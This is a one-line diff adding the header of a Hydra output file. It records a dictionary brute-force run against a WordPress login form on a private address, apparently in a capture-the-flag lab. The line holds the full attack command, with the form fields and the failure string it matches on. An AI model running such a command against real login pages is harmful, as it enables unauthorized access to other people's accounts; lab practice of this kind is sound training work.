@@ -1,0 +1,1 @@
+# Hydra v9.6 run at 2026-05-28 00:17:14 on 10.49.150.230 http-post-form (hydra -L fsocity.dic -P fsocity.dic -o brute_force_result.txt 10.49.150.230 http-post-form /wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.49.150.230%2Fwp-admin%2F&testcookie=1:ERROR)
